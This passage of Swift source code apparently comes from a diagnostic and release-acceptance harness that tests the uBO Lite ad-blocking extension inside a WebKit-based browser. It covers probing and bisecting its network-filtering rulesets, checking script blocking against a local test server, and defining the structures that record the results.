            controller.didActivateTab(tab, previousActiveTab: nil)

            _ = try await setStaticRulesets(Ruleset.defaults.map(\.identifier))

            let navigationWaiter = FloorpUBOLNavigationWaiter()
            try await navigationWaiter.load(
                URL(string: "http://localhost:\(server.port)/")!,
                in: browsingWebView
            )
            try await Task.sleep(nanoseconds: 750_000_000)
            let rawResult = try await browsingWebView.floorpCallAsyncJavaScript(
                """
                return {
                    controlScriptExecuted: window.floorpControlScriptExecuted === true,
                    blockedScriptExecuted: window.floorpBlockedScriptExecuted === true
                };
                """,
                arguments: [:],
                contentWorld: .page
            )
            guard let result = rawResult as? [String: Any],
                  let controlScriptExecuted = result["controlScriptExecuted"] as? Bool,
                  let blockedScriptExecuted = result["blockedScriptExecuted"] as? Bool else {
                throw FloorpUBOLDNRDiagnosticError.invalidJavaScriptResult(
                    "runtime verification returned \(String(describing: rawResult))"
                )
            }

            withExtendedLifetime(delegate) {}
            let verification = FloorpUBOLDNRRuntimeVerification(
                filter: filter,
                requestPath: requestPath,
                controlScriptExecuted: controlScriptExecuted,
                blockedScriptExecuted: blockedScriptExecuted,
                succeeded: controlScriptExecuted && !blockedScriptExecuted,
                durationMilliseconds: Self.elapsedMilliseconds(since: startedAt),
                error: nil
            )
            Self.log(verification)
            return verification
        } catch {
            let verification = FloorpUBOLDNRRuntimeVerification(
                filter: filter,
                requestPath: requestPath,
                controlScriptExecuted: false,
                blockedScriptExecuted: true,
                succeeded: false,
                durationMilliseconds: Self.elapsedMilliseconds(since: startedAt),
                error: FloorpUBOLDNRErrorRecord(error)
            )
            Self.log(verification)
            return verification
        }
    }

    private func probeStaticRulesets(_ rulesets: [Ruleset]) async -> FloorpUBOLDNRProbeResult {
        let identifiers = rulesets.map(\.identifier)
        let startedAt = Date()
        let result: FloorpUBOLDNRProbeResult

        do {
            let enabled = try await setStaticRulesets(identifiers)
            if Set(enabled) == Set(identifiers) {
                result = FloorpUBOLDNRProbeResult(
                    kind: .staticRulesets,
                    label: identifiers.joined(separator: "+"),
                    rulesetIdentifiers: identifiers,
                    rangeStart: nil,
                    rangeEnd: nil,
                    declaredRuleCount: rulesets.reduce(0) { $0 + $1.declaredRuleCount },
                    succeeded: true,
                    durationMilliseconds: Self.elapsedMilliseconds(since: startedAt),
                    error: nil
                )
            } else {
                result = FloorpUBOLDNRProbeResult(
                    kind: .staticRulesets,
                    label: identifiers.joined(separator: "+"),
                    rulesetIdentifiers: identifiers,
                    rangeStart: nil,
                    rangeEnd: nil,
                    declaredRuleCount: rulesets.reduce(0) { $0 + $1.declaredRuleCount },
                    succeeded: false,
                    durationMilliseconds: Self.elapsedMilliseconds(since: startedAt),
                    error: FloorpUBOLDNRErrorRecord(
                        domain: "FloorpUBOLDNRDiagnostic",
                        code: 1,
                        message: "WebKit enabled \(enabled.sorted()) instead of \(identifiers.sorted())."
                    )
                )
            }
        } catch {
            result = FloorpUBOLDNRProbeResult(
                kind: .staticRulesets,
                label: identifiers.joined(separator: "+"),
                rulesetIdentifiers: identifiers,
                rangeStart: nil,
                rangeEnd: nil,
                declaredRuleCount: rulesets.reduce(0) { $0 + $1.declaredRuleCount },
                succeeded: false,
                durationMilliseconds: Self.elapsedMilliseconds(since: startedAt),
                error: FloorpUBOLDNRErrorRecord(error)
            )
        }

        _ = try? await setStaticRulesets([])
        Self.log(result)
        return result
    }

    private func establishEmptyBaseline() async throws -> [String] {
        let retryDelaysInSeconds: [UInt64] = [2, 5, 10, 20, 30]
        var lastError: (any Error)?

        for (attempt, delay) in retryDelaysInSeconds.enumerated() {
            do {
                let enabled = try await setStaticRulesets([])
                print("FLOORP_UBOL_DNR_BASELINE attempt=\(attempt + 1) succeeded")
                return enabled
            } catch {
                lastError = error
                print(
                    "FLOORP_UBOL_DNR_BASELINE attempt=\(attempt + 1) failed "
                        + "error=\((error as NSError).localizedDescription) retryIn=\(delay)s"
                )
                try await Task.sleep(nanoseconds: delay * 1_000_000_000)
            }
        }

        do {
            return try await setStaticRulesets([])
        } catch {
            throw lastError ?? error
        }
    }

    private func bisectFailure(in ruleset: Ruleset) async -> [FloorpUBOLDNRProbeResult] {
        let completeRange = 0..<ruleset.declaredRuleCount
        let seedRanges: [Range<Int>]
        if completeRange.count <= Self.dynamicRuleLimit {
            seedRanges = [completeRange]
        } else {
            seedRanges = Self.split(completeRange)
        }

        var results = [FloorpUBOLDNRProbeResult]()
        for range in seedRanges {
            let probe = await probeDynamicRules(ruleset: ruleset, range: range)
            results.append(probe)
            if !probe.succeeded, range.count > 1 {
                results.append(contentsOf: await bisectDynamicFailure(
                    ruleset: ruleset,
                    range: range
                ))
            }
        }
        return results
    }

    private func bisectDynamicFailure(
        ruleset: Ruleset,
        range: Range<Int>
    ) async -> [FloorpUBOLDNRProbeResult] {
        guard range.count > 1, remainingBisectionProbeCount > 0 else { return [] }

        var results = [FloorpUBOLDNRProbeResult]()
        for childRange in Self.split(range) where remainingBisectionProbeCount > 0 {
            let probe = await probeDynamicRules(ruleset: ruleset, range: childRange)
            results.append(probe)
            if !probe.succeeded, childRange.count > 1 {
                results.append(contentsOf: await bisectDynamicFailure(
                    ruleset: ruleset,
                    range: childRange
                ))
            }
        }
        return results
    }

    private func probeDynamicRules(
        ruleset: Ruleset,
        range: Range<Int>
    ) async -> FloorpUBOLDNRProbeResult {
        remainingBisectionProbeCount -= 1
        let startedAt = Date()
        let result: FloorpUBOLDNRProbeResult

        do {
            try await clearDynamicRules()
            let addedRuleCount = try await addDynamicRules(
                resourcePath: ruleset.resourcePath,
                range: range
            )
            guard addedRuleCount == range.count else {
                throw FloorpUBOLDNRDiagnosticError.dynamicRuleCountMismatch(
                    expected: range.count,
                    actual: addedRuleCount
                )
            }
            result = FloorpUBOLDNRProbeResult(
                kind: .dynamicRange,
                label: "\(ruleset.identifier)[\(range.lowerBound)..<\(range.upperBound)]",
                rulesetIdentifiers: [ruleset.identifier],
                rangeStart: range.lowerBound,
                rangeEnd: range.upperBound,
                declaredRuleCount: range.count,
                succeeded: true,
                durationMilliseconds: Self.elapsedMilliseconds(since: startedAt),
                error: nil
            )
        } catch {
            result = FloorpUBOLDNRProbeResult(
                kind: .dynamicRange,
                label: "\(ruleset.identifier)[\(range.lowerBound)..<\(range.upperBound)]",
                rulesetIdentifiers: [ruleset.identifier],
                rangeStart: range.lowerBound,
                rangeEnd: range.upperBound,
                declaredRuleCount: range.count,
                succeeded: false,
                durationMilliseconds: Self.elapsedMilliseconds(since: startedAt),
                error: FloorpUBOLDNRErrorRecord(error)
            )
        }

        try? await clearDynamicRules()
        Self.log(result)
        return result
    }

    private func enabledStaticRulesets() async throws -> [String] {
        let result = try await webView.floorpCallAsyncJavaScript(
            "return await browser.declarativeNetRequest.getEnabledRulesets();",
            arguments: [:],
            contentWorld: .page
        )
        guard let enabled = result as? [String] else {
            throw FloorpUBOLDNRDiagnosticError.invalidJavaScriptResult(
                "getEnabledRulesets returned \(String(describing: result))"
            )
        }
        return enabled
    }

    private func setStaticRulesets(_ requestedIdentifiers: [String]) async throws -> [String] {
        let result = try await webView.floorpCallAsyncJavaScript(
            """
            const requested = requestedIdentifiers;
            const current = await browser.declarativeNetRequest.getEnabledRulesets();
            const enableRulesetIds = requested.filter(id => !current.includes(id));
            const disableRulesetIds = current.filter(id => !requested.includes(id));
            if (enableRulesetIds.length || disableRulesetIds.length) {
                await browser.declarativeNetRequest.updateEnabledRulesets({
                    enableRulesetIds,
                    disableRulesetIds
                });
            }
            return await browser.declarativeNetRequest.getEnabledRulesets();
            """,
            arguments: ["requestedIdentifiers": requestedIdentifiers],
            contentWorld: .page
        )
        guard let enabled = result as? [String] else {
            throw FloorpUBOLDNRDiagnosticError.invalidJavaScriptResult(
                "updateEnabledRulesets returned \(String(describing: result))"
            )
        }
        return enabled
    }

    private func addDynamicRules(
        resourcePath: String,
        range: Range<Int>
    ) async throws -> Int {
        guard range.count <= Self.dynamicRuleLimit else {
            throw FloorpUBOLDNRDiagnosticError.dynamicRuleLimitExceeded(range.count)
        }
        let result = try await webView.floorpCallAsyncJavaScript(
            """
            const response = await fetch(browser.runtime.getURL(resourcePath));
            if (!response.ok) {
                throw new Error(`Unable to read ${resourcePath}: HTTP ${response.status}`);
            }
            const rules = await response.json();
            const selectedRules = rules.slice(rangeStart, rangeEnd);
            await browser.declarativeNetRequest.updateDynamicRules({
                addRules: selectedRules
            });
            return selectedRules.length;
            """,
            arguments: [
                "resourcePath": resourcePath,
                "rangeStart": range.lowerBound,
                "rangeEnd": range.upperBound
            ],
            contentWorld: .page
        )
        guard let number = result as? NSNumber else {
            throw FloorpUBOLDNRDiagnosticError.invalidJavaScriptResult(
                "updateDynamicRules returned \(String(describing: result))"
            )
        }
        return number.intValue
    }

    private func clearDynamicRules() async throws {
        _ = try await webView.floorpCallAsyncJavaScript(
            """
            const rules = await browser.declarativeNetRequest.getDynamicRules();
            if (rules.length) {
                await browser.declarativeNetRequest.updateDynamicRules({
                    removeRuleIds: rules.map(rule => rule.id)
                });
            }
            return rules.length;
            """,
            arguments: [:],
            contentWorld: .page
        )
    }

    private static func split(_ range: Range<Int>) -> [Range<Int>] {
        let midpoint = range.lowerBound + (range.count / 2)
        return [range.lowerBound..<midpoint, midpoint..<range.upperBound].filter { !$0.isEmpty }
    }

    private static func elapsedMilliseconds(since date: Date) -> Int {
        Int((Date().timeIntervalSince(date) * 1_000).rounded())
    }

    private static func log(_ result: FloorpUBOLDNRProbeResult) {
        let errorDescription = result.error?.message ?? "none"
        print(
            "FLOORP_UBOL_DNR_PROBE kind=\(result.kind.rawValue) label=\(result.label) "
                + "rules=\(result.declaredRuleCount) succeeded=\(result.succeeded) "
                + "durationMs=\(result.durationMilliseconds) error=\(errorDescription)"
        )
    }

    private static func log(_ verification: FloorpUBOLDNRRuntimeVerification) {
        let errorDescription = verification.error?.message ?? "none"
        print(
            "FLOORP_UBOL_DNR_RUNTIME filter=\(verification.filter) "
                + "controlExecuted=\(verification.controlScriptExecuted) "
                + "blockedExecuted=\(verification.blockedScriptExecuted) "
                + "succeeded=\(verification.succeeded) "
                + "durationMs=\(verification.durationMilliseconds) error=\(errorDescription)"
        )
    }

    nonisolated private static func makeRuntimeServer(
        blockedRequestPath: String
    ) throws -> GCDWebServer {
        let server = GCDWebServer()
        server.addHandler(
            forMethod: "GET",
            path: "/",
            request: GCDWebServerRequest.self
        ) { _ in
            GCDWebServerDataResponse(html: """
            <!doctype html>
            <script>window.floorpControlScriptExecuted = false;</script>
            <script>window.floorpBlockedScriptExecuted = false;</script>
            <script src="/control.js"></script>
            <script src="\(blockedRequestPath)"></script>
            """)
        }
        server.addHandler(
            forMethod: "GET",
            path: "/control.js",
            request: GCDWebServerRequest.self
        ) { _ in
            GCDWebServerDataResponse(
                data: Data("window.floorpControlScriptExecuted = true;".utf8),
                contentType: "text/javascript"
            )
        }
        let blockedPathWithoutQuery = blockedRequestPath.split(separator: "?", maxSplits: 1)
            .first.map(String.init) ?? blockedRequestPath
        server.addHandler(
            forMethod: "GET",
            path: blockedPathWithoutQuery,
            request: GCDWebServerRequest.self
        ) { _ in
            GCDWebServerDataResponse(
                data: Data("window.floorpBlockedScriptExecuted = true;".utf8),
                contentType: "text/javascript"
            )
        }
        guard server.start(withPort: 0, bonjourName: nil) else {
            throw FloorpUBOLDNRDiagnosticError.runtimeServerUnavailable
        }
        return server
    }
}

private struct FloorpUBOLDNRDiagnosticReport: Codable {
    let schemaVersion: Int
    let operatingSystem: String
    let webKitBundleVersion: String
    let packageVersion: String
    let initiallyEnabledRulesets: [String]
    let baselineEnabledRulesets: [String]
    let declaredDefaultRuleCount: Int
    let staticProbes: [FloorpUBOLDNRProbeResult]
    let bisectionProbes: [FloorpUBOLDNRProbeResult]
    let runtimeVerification: FloorpUBOLDNRRuntimeVerification
    let contextErrors: [FloorpUBOLDNRErrorRecord]
}

private struct FloorpUBOLReleaseAcceptanceReport: Codable {
    let schemaVersion: Int
    let operatingSystem: String
    let webKitBundleVersion: String
    let packageVersion: String
    let defaultStaticRuleCount: Int
    let japaneseStaticRuleCount: Int
    let optimalFilteringLevel: Int
    let completeFilteringLevel: Int
    let optimalRegisteredContentScripts: [String]
    let completeRegisteredContentScripts: [String]
    let completeContentScriptRegistrations: [FloorpUBOLContentScriptRegistration]
    let japaneseRegisteredContentScripts: [String]
    let japaneseContentScriptRegistrations: [FloorpUBOLContentScriptRegistration]
    let enabledRulesetsWithJapanese: [String]
    let dynamicRuleCount: Int
    let sessionRuleCount: Int
    let dynamicRuleCountAfterRulesetUpdate: Int
    let sessionRuleCountAfterRulesetUpdate: Int
    let restoredSessionRuleCount: Int
    let strictBlock: FloorpUBOLStrictBlockAcceptance
    let popup: FloorpUBOLPopupAcceptance
    let optimal: FloorpUBOLPageAcceptance
    let dynamicAndSession: FloorpUBOLPageAcceptance
    let complete: FloorpUBOLPageAcceptance
    let japanese: FloorpUBOLPageAcceptance
    let privateBrowsing: FloorpUBOLPageAcceptance
    let backgroundWake: FloorpUBOLBackgroundWakeAcceptance
    let contextErrors: [FloorpUBOLDNRErrorRecord]

    var succeeded: Bool {
        let expectedJapanese = ["easylist", "easyprivacy", "jpn-1", "ublock-filters"]
        return packageVersion == "2026.825.1619"
            && defaultStaticRuleCount == 113_100
            && japaneseStaticRuleCount == 1_906
            && optimalFilteringLevel == 2
            && completeFilteringLevel == 3
            && Set(["css-specific", "css-user", "ublock-filters.main", "ublock-filters.isolated"])
                .isSubset(of: Set(optimalRegisteredContentScripts))
            && Set(["css-generic-all", "css-specific", "css-user", "ublock-filters.main"])
                .isSubset(of: Set(completeRegisteredContentScripts))
            && Set(["jpn-1.main", "jpn-1.isolated"])
                .isSubset(of: Set(japaneseRegisteredContentScripts))
            && enabledRulesetsWithJapanese == expectedJapanese
            && dynamicRuleCount == 1
            && sessionRuleCount == 1
            && dynamicRuleCountAfterRulesetUpdate == 1
            && sessionRuleCountAfterRulesetUpdate == 0
            && restoredSessionRuleCount == 1
            && strictBlock.configured == false
            && strictBlock.redirectRuleCount == 0
            && strictBlock.upstreamSafariLimitation
            && popup.loadingCleared
            && popup.hostname == "localhost"
            && popup.filteringLevel == optimalFilteringLevel
            && popup.matchedRulesEnabled
            && popup.privateLoadingCleared
            && popup.privateHostname == "localhost"
            && popup.privateFilteringLevel == optimalFilteringLevel
            && popup.privateMatchedRulesEnabled
            && popup.matchedRulesRouting.succeeded
            && optimal.controlScriptExecuted
            && !optimal.defaultBlockedScriptExecuted
            && optimal.customCosmeticHidden
            && optimal.proceduralCosmeticHidden
            && !optimal.genericCosmeticHidden
            && !optimal.highlyGenericCosmeticHidden
            && !optimal.japaneseCosmeticHidden
            && !optimal.japaneseHighlyGenericCosmeticHidden
            && optimal.stockScriptletExecuted
            && dynamicAndSession.controlScriptExecuted
            && !dynamicAndSession.defaultBlockedScriptExecuted
            && !dynamicAndSession.dynamicBlockedScriptExecuted
            && !dynamicAndSession.sessionBlockedScriptExecuted
            && complete.controlScriptExecuted
            && !complete.defaultBlockedScriptExecuted
            && complete.customCosmeticHidden
            && complete.proceduralCosmeticHidden
            && complete.genericCosmeticHidden
            && complete.highlyGenericCosmeticHidden
            && !complete.japaneseCosmeticHidden
            && !complete.japaneseHighlyGenericCosmeticHidden
            && complete.stockScriptletExecuted
            && japanese.controlScriptExecuted
            && !japanese.defaultBlockedScriptExecuted
            && !japanese.dynamicBlockedScriptExecuted
            && !japanese.sessionBlockedScriptExecuted
            && japanese.genericCosmeticHidden
            && japanese.highlyGenericCosmeticHidden
            && japanese.japaneseCosmeticHidden
            && japanese.japaneseHighlyGenericCosmeticHidden
            && japanese.stockScriptletExecuted
            && privateBrowsing.controlScriptExecuted
            && !privateBrowsing.defaultBlockedScriptExecuted
            && !privateBrowsing.dynamicBlockedScriptExecuted
            && !privateBrowsing.sessionBlockedScriptExecuted
            && privateBrowsing.customCosmeticHidden
            && privateBrowsing.proceduralCosmeticHidden
            && privateBrowsing.genericCosmeticHidden
            && privateBrowsing.highlyGenericCosmeticHidden
            && privateBrowsing.japaneseCosmeticHidden
            && privateBrowsing.japaneseHighlyGenericCosmeticHidden
            && privateBrowsing.stockScriptletExecuted
            && backgroundWake.packageVersion == packageVersion
            && backgroundWake.filteringLevel == 3
            && backgroundWake.enabledRulesets == expectedJapanese
            && backgroundWake.customFilterCount == 2
            && backgroundWake.privateAccessPreserved
            && Set(["css-generic-all", "css-user", "jpn-1.main"])
                .isSubset(of: Set(backgroundWake.registeredContentScripts))
            && contextErrors.isEmpty
    }

    var failureSummary: String {
        succeeded ? "All uBO Lite release gates passed." :
            "One or more uBO Lite release gates failed. Inspect uBOL-release-acceptance.json."
    }
}

private struct FloorpUBOLPopupAcceptance: Codable {
    let loadingCleared: Bool
    let hostname: String
    let filteringLevel: Int
    let matchedRulesEnabled: Bool
    let privateLoadingCleared: Bool
    let privateHostname: String
    let privateFilteringLevel: Int
    let privateMatchedRulesEnabled: Bool
    let matchedRulesRouting: FloorpUBOLMatchedRulesRoutingAcceptance
}

private struct FloorpUBOLPopupWindowAcceptance {
    let hostname: String
    let filteringLevel: Int
    let matchedRulesEnabled: Bool
}

private struct FloorpUBOLMatchedRulesRoutingAcceptance: Codable {
    let normal: FloorpUBOLMatchedRulesWindowAcceptance
    let privateBrowsing: FloorpUBOLMatchedRulesWindowAcceptance

    var succeeded: Bool {
        !normal.requestedPrivate
            && privateBrowsing.requestedPrivate
            && normal.urls.count == 1
            && privateBrowsing.urls.count == 1
            && normal.hasExactMatchedRulesURL
            && privateBrowsing.hasExactMatchedRulesURL
    }
}

private struct FloorpUBOLMatchedRulesWindowAcceptance: Codable {
    let sourceTabID: Int
    let requestedPrivate: Bool
    let urls: [String]

    var hasExactMatchedRulesURL: Bool {
        guard urls.count == 1,
              let components = URLComponents(string: urls[0]) else { return false }
        return components.path == "/matched-rules.html"
            && components.queryItems == [
                URLQueryItem(name: "tab", value: String(sourceTabID))
            ]
    }
}

private struct FloorpUBOLPageAcceptance: Codable {
    let controlScriptExecuted: Bool
    let defaultBlockedScriptExecuted: Bool
    let dynamicBlockedScriptExecuted: Bool
    let sessionBlockedScriptExecuted: Bool
    let customCosmeticHidden: Bool
    let proceduralCosmeticHidden: Bool
    let genericCosmeticHidden: Bool
    let highlyGenericCosmeticHidden: Bool
    let japaneseCosmeticHidden: Bool
    let japaneseHighlyGenericCosmeticHidden: Bool
    let stockScriptletExecuted: Bool

    init(_ dictionary: [String: Any]) throws {
        func boolean(_ key: String) throws -> Bool {
            guard let value = dictionary[key] as? Bool else {
                throw FloorpUBOLDNRDiagnosticError.invalidJavaScriptResult(
                    "page acceptance key \(key) is missing from \(dictionary)"
                )
            }
            return value
        }
        controlScriptExecuted = try boolean("controlScriptExecuted")
        defaultBlockedScriptExecuted = try boolean("defaultBlockedScriptExecuted")
        dynamicBlockedScriptExecuted = try boolean("dynamicBlockedScriptExecuted")
        sessionBlockedScriptExecuted = try boolean("sessionBlockedScriptExecuted")
        customCosmeticHidden = try boolean("customCosmeticHidden")
        proceduralCosmeticHidden = try boolean("proceduralCosmeticHidden")
        genericCosmeticHidden = try boolean("genericCosmeticHidden")
        highlyGenericCosmeticHidden = try boolean("highlyGenericCosmeticHidden")
        japaneseCosmeticHidden = try boolean("japaneseCosmeticHidden")
        japaneseHighlyGenericCosmeticHidden = try boolean("japaneseHighlyGenericCosmeticHidden")
        stockScriptletExecuted = try boolean("stockScriptletExecuted")
    }
}

private struct FloorpUBOLContentScriptRegistration: Codable {
    let identifier: String
    let javaScriptFiles: [String]
    let matches: [String]
    let excludeMatchCount: Int
    let excludesLocalhost: Bool
    let runAt: String

    init(_ dictionary: [String: Any]) throws {
        guard let identifier = dictionary["identifier"] as? String,
              let javaScriptFiles = dictionary["javaScriptFiles"] as? [String],
              let matches = dictionary["matches"] as? [String],
              let excludeMatchCount = (dictionary["excludeMatchCount"] as? NSNumber)?.intValue,
              let excludesLocalhost = dictionary["excludesLocalhost"] as? Bool,
              let runAt = dictionary["runAt"] as? String else {
            throw FloorpUBOLDNRDiagnosticError.invalidJavaScriptResult(
                "content script registration is invalid: \(dictionary)"
            )
        }
        self.identifier = identifier
        self.javaScriptFiles = javaScriptFiles
        self.matches = matches
        self.excludeMatchCount = excludeMatchCount
        self.excludesLocalhost = excludesLocalhost
        self.runAt = runAt
    }
}

private struct FloorpUBOLStrictBlockAcceptance: Codable {
    let configured: Bool
    let redirectRuleCount: Int
    let upstreamSafariLimitation: Bool
}

private struct FloorpUBOLBackgroundWakeAcceptance: Codable {
    let packageVersion: String
    let filteringLevel: Int
    let enabledRulesets: [String]
    let customFilterCount: Int
    let registeredContentScripts: [String]
    let privateAccessPreserved: Bool
}

private struct FloorpUBOLDNRRuntimeVerification: Codable {
    let filter: String
    let requestPath: String
    let controlScriptExecuted: Bool
    let blockedScriptExecuted: Bool
    let succeeded: Bool
    let durationMilliseconds: Int
    let error: FloorpUBOLDNRErrorRecord?
}

private struct FloorpUBOLDNRProbeResult: Codable {
    enum Kind: String, Codable {
        case staticRulesets
        case dynamicRange
    }

    let kind: Kind
    let label: String
    let rulesetIdentifiers: [String]
    let rangeStart: Int?
    let rangeEnd: Int?
    let declaredRuleCount: Int
    let succeeded: Bool
    let durationMilliseconds: Int
    let error: FloorpUBOLDNRErrorRecord?
}

private struct FloorpUBOLDNRErrorRecord: Codable {
    let domain: String
    let code: Int
    let message: String

    init(_ error: any Error) {
        let error = error as NSError
        self.init(domain: error.domain, code: error.code, message: error.localizedDescription)
    }

    init(domain: String, code: Int, message: String) {
        self.domain = domain
        self.code = code
        self.message = message
    }
}

private enum FloorpUBOLDNRDiagnosticError: LocalizedError {
    case packageErrors([String])
    case extensionPageConfigurationUnavailable
    case extensionContextDidNotUnload
    case invalidJavaScriptResult(String)
    case javaScriptTimedOut
    case navigationTimedOut(URL)
    case webContentProcessTerminated
    case dynamicRuleLimitExceeded(Int)
    case dynamicRuleCountMismatch(expected: Int, actual: Int)
    case runtimeServerUnavailable

    var errorDescription: String? {
        switch self {
        case .packageErrors(let errors):
            return "WebKit rejected the uBO Lite package: \(errors.joined(separator: "; "))"
        case .extensionPageConfigurationUnavailable:
            return "WebKit did not provide an extension-page configuration."
        case .extensionContextDidNotUnload:
            return "WebKit did not fully detach the uBO Lite extension context."
        case .invalidJavaScriptResult(let description):
            return "The WebExtension diagnostic API returned an invalid value: \(description)"
        case .javaScriptTimedOut:
            return "A WebExtension JavaScript operation timed out."
        case .navigationTimedOut(let url):
            return "The WebExtension diagnostic navigation timed out: \(url.absoluteString)"
        case .webContentProcessTerminated:
            return "The WebExtension diagnostic WebContent process terminated."
        case .dynamicRuleLimitExceeded(let count):
            return "The diagnostic attempted to add \(count) dynamic rules; the limit is 30,000."
        case .dynamicRuleCountMismatch(let expected, let actual):
            return "WebKit added \(actual) dynamic rules; \(expected) were requested."
        case .runtimeServerUnavailable:
            return "The local uBO Lite runtime-verification server could not be started."
        }
    }
}

@MainActor
private struct FloorpUBOLJavaScriptValue: @unchecked Sendable {
    let value: Any?
}

@MainActor
private final class FloorpUBOLJavaScriptCallGate {
    private var continuation: CheckedContinuation<FloorpUBOLJavaScriptValue, any Error>?

    init(continuation: CheckedContinuation<FloorpUBOLJavaScriptValue, any Error>) {
        self.continuation = continuation
    }

    func resolve(_ result: Result<Any, any Error>) {
        guard let continuation else { return }
        self.continuation = nil
        switch result {
        case .success(let value):
            continuation.resume(returning: FloorpUBOLJavaScriptValue(value: value))
        case .failure(let error):
            continuation.resume(throwing: error)
        }
    }

    func timeout() {
        guard let continuation else { return }
        self.continuation = nil
        continuation.resume(throwing: FloorpUBOLDNRDiagnosticError.javaScriptTimedOut)
    }
}

extension WKWebView {
    @MainActor
    func floorpCallAsyncJavaScript(
        _ functionBody: String,
        arguments: [String: Any] = [:],
        contentWorld: WKContentWorld,
        timeoutNanoseconds: UInt64 = 60_000_000_000
    ) async throws -> Any? {
        let boxed: FloorpUBOLJavaScriptValue = try await withCheckedThrowingContinuation { continuation in
            let gate = FloorpUBOLJavaScriptCallGate(continuation: continuation)
            callAsyncJavaScript(
                functionBody,
                arguments: arguments,
                in: nil,
                in: contentWorld
            ) { result in
                gate.resolve(result)
            }
            Task { @MainActor in
                try? await Task.sleep(nanoseconds: timeoutNanoseconds)
                gate.timeout()
            }
        }
        return boxed.value
    }
}

@MainActor
private final class FloorpUBOLNavigationWaiter: NSObject, WKNavigationDelegate {
    private var continuation: CheckedContinuation<Void, any Error>?
    private var loadToken: UUID?

    func load(_ url: URL, in webView: WKWebView) async throws {
        webView.navigationDelegate = self
        let token = UUID()
        loadToken = token
        try await withCheckedThrowingContinuation { continuation in
            self.continuation = continuation
            webView.load(URLRequest(url: url))
            Task { @MainActor [weak self, weak webView] in
                try? await Task.sleep(nanoseconds: 30_000_000_000)
                guard let self, self.loadToken == token else { return }
                webView?.stopLoading()
                self.complete(.failure(FloorpUBOLDNRDiagnosticError.navigationTimedOut(url)))
            }
        }
    }

    func webView(_ webView: WKWebView, didFinish navigation: WKNavigation?) {
        complete(.success(()))
    }

    func webView(
        _ webView: WKWebView,
        didFail navigation: WKNavigation?,
        withError error: any Error
    ) {
        complete(.failure(error))
    }

    func webView(
        _ webView: WKWebView,
        didFailProvisionalNavigation navigation: WKNavigation?,
        withError error: any Error
    ) {
        complete(.failure(error))
    }

    func webViewWebContentProcessDidTerminate(_ webView: WKWebView) {
        complete(.failure(FloorpUBOLDNRDiagnosticError.webContentProcessTerminated))
    }

    private func complete(_ result: Result<Void, any Error>) {
        guard let continuation else { return }
        self.continuation = nil
        loadToken = nil
        continuation.resume(with: result)
    }
}

@MainActor
private final class FloorpUBOLDiagnosticControllerDelegate: NSObject,
    WKWebExtensionControllerDelegate {
    let windows: [FloorpUBOLDiagnosticWindow]
    var focusedWindow: FloorpUBOLDiagnosticWindow
    var actionPopupHandler: ((WKWebExtension.Action) -> Void)?
    var openNewTabHandler: (
        (WKWebExtension.TabConfiguration) -> (any WKWebExtensionTab)?
    )?

    init(window: FloorpUBOLDiagnosticWindow) {
        self.windows = [window]
        self.focusedWindow = window
    }

    init(
        windows: [FloorpUBOLDiagnosticWindow],
        focusedWindow: FloorpUBOLDiagnosticWindow
    ) {
        self.windows = windows
        self.focusedWindow = focusedWindow
    }

    func webExtensionController(
        _ controller: WKWebExtensionController,
        openWindowsFor extensionContext: WKWebExtensionContext
    ) -> [any WKWebExtensionWindow] {
        windows
    }

    func webExtensionController(
        _ controller: WKWebExtensionController,
        focusedWindowFor extensionContext: WKWebExtensionContext
    ) -> (any WKWebExtensionWindow)? {
        focusedWindow
    }

    func webExtensionController(
        _ controller: WKWebExtensionController,
        presentActionPopup action: WKWebExtension.Action,
        for context: WKWebExtensionContext,
        completionHandler: @escaping ((any Error)?) -> Void
    ) {
        guard let actionPopupHandler else {
            completionHandler(FloorpUBOLDNRDiagnosticError.invalidJavaScriptResult(
                "No action popup presenter is configured"
            ))
            return
        }
        actionPopupHandler(action)
        completionHandler(nil)
    }

    func webExtensionController(
        _ controller: WKWebExtensionController,
        openNewTabUsing configuration: WKWebExtension.TabConfiguration,
        for extensionContext: WKWebExtensionContext,
        completionHandler: @escaping ((any WKWebExtensionTab)?, (any Error)?) -> Void
    ) {
        guard let openNewTabHandler else {
            completionHandler(
                nil,
                FloorpUBOLDNRDiagnosticError.invalidJavaScriptResult(
                    "No diagnostic tab opener is configured"
                )
            )
            return
        }
        guard let tab = openNewTabHandler(configuration) else {
            completionHandler(
                nil,
                FloorpUBOLDNRDiagnosticError.invalidJavaScriptResult(
                    "The diagnostic tab request did not target the expected window"
                )
            )
            return
        }
        completionHandler(tab, nil)
    }
}

@MainActor
private final class FloorpUBOLDiagnosticWindow: NSObject, WKWebExtensionWindow {
    let tab: FloorpUBOLDiagnosticTab
    let isPrivateBrowsing: Bool

    init(tab: FloorpUBOLDiagnosticTab, isPrivateBrowsing: Bool = false) {
        self.tab = tab
        self.isPrivateBrowsing = isPrivateBrowsing
    }

    func tabs(for context: WKWebExtensionContext) -> [any WKWebExtensionTab] {
        [tab]
    }

    func activeTab(for context: WKWebExtensionContext) -> (any WKWebExtensionTab)? {
        tab
    }

    func isPrivate(for context: WKWebExtensionContext) -> Bool {
        isPrivateBrowsing
    }

    func windowType(for context: WKWebExtensionContext) -> WKWebExtension.WindowType {
        .normal
    }

    func windowState(for context: WKWebExtensionContext) -> WKWebExtension.WindowState {
        .normal
    }

    func frame(for context: WKWebExtensionContext) -> CGRect {
        tab.webView.bounds
    }
}

@MainActor
private final class FloorpUBOLDiagnosticTab: NSObject, WKWebExtensionTab {
    let webView: WKWebView
    weak var diagnosticWindow: FloorpUBOLDiagnosticWindow?

    init(webView: WKWebView) {
        self.webView = webView
    }

    func window(for context: WKWebExtensionContext) -> (any WKWebExtensionWindow)? {
        diagnosticWindow
    }

    func indexInWindow(for context: WKWebExtensionContext) -> Int {
        0
    }

    func webView(for context: WKWebExtensionContext) -> WKWebView? {
        webView
    }

    func title(for context: WKWebExtensionContext) -> String? {
        webView.title
    }

    func url(for context: WKWebExtensionContext) -> URL? {
        webView.url
    }

    func pendingURL(for context: WKWebExtensionContext) -> URL? {
        webView.url
    }

    func isLoadingComplete(for context: WKWebExtensionContext) -> Bool {
        !webView.isLoading
    }

    func isSelected(for context: WKWebExtensionContext) -> Bool {
        true
    }

    func shouldGrantPermissionsOnUserGesture(for context: WKWebExtensionContext) -> Bool {
        true
    }

    func shouldBypassPermissions(for context: WKWebExtensionContext) -> Bool {
        false
    }
}
